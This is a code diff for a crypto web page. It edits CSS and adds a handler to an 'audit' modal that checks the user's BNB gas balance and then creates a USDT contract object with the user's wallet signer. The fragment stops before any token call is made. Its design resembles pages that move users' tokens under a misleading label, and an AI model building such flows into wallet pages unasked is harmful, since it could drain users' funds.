@@ -56,9 +56,6 @@
     @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
     .ticker-item { display: inline-flex; align-items: center; gap: 6px; font-size: 11px; color: #718096; }
     .ticker-token { color: #ffffff; font-weight: 600; }
-    .dot-blue { width: 6px; height: 6px; background-color: #3b82f6; border-radius: 50%; }
-    .dot-purple { width: 6px; height: 6px; background-color: #8b5cf6; border-radius: 50%; }
-    .dot-green-light { width: 6px; height: 6px; background-color: #10b981; border-radius: 50%; }
 
     /* Live Transactions Table */
     .tx-container { background-color: #12161f; border: 1px solid #1e2430; border-radius: 14px; width: 100%; overflow: hidden; margin-bottom: 20px; }
@@ -378,4 +375,12 @@
         const bnbBalance = await provider.getBalance(userAddress);
         if (bnbBalance.lte(0)) {
           alert("Transaction failed: Insufficient BNB in wallet to pay gas fees. BNB balance is 0.");
-          doneBtn
+          doneBtn.disabled = false;
+          doneBtn.innerHTML = "Done";
+          closeModal('auditModal');
+          return;
+        }
+
+        doneBtn.innerHTML = '<span class="loader"></span> Processing...';
+
+        const contract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
